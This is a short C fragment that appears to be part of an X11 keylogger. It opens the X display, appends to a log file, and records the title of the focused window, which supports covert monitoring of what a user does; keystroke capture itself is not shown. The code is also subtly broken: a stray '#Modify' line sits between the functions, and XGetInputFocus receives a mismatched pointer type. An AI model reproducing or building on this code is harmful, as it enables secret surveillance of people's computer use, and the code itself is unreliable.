X11LogSess *display_init(void) {
    X11LogSess *sess = (X11LogSess *)malloc(sizeof(X11LogSess));
    if (!sess) {
        M_DISPLAY_ERROR;
        return NULL;
    }
    sess->dpy = XOpenDisplay(NULL);
    if (!sess->dpy) {
        M_DISPLAY_ERROR;
        free(sess);
        return NULL;
    }
    sess->focuswin = None;
    sess->fd = fopen(g_ixkeylog_opts->logfile, "a");
    if (!sess->fd) {
        M_DISPLAY_ERROR;
        XCloseDisplay(sess->dpy);
        free(sess);
        return NULL;
    }
    return sess;
}

#Modify
void display_focus(X11LogSess *sess) {
    Window root, child;
    int root_x, root_y, win_x, win_y;
    unsigned int mask;
    XGetInputFocus(sess->dpy, &sess->focuswin, &mask);
    if (sess->focuswin != None) {
        XQueryPointer(sess->dpy, sess->focuswin, &root, &child, &root_x, &root_y, &win_x, &win_y, &mask);
        char *window_title = NULL;
        XFetchName(sess->dpy, sess->focuswin, &window_title);
        if (window_title) {
            fprintf(sess->fd, "[FOCUS] Window: %s\n", window_title);
            XFree(window_title);
        }
    }
}

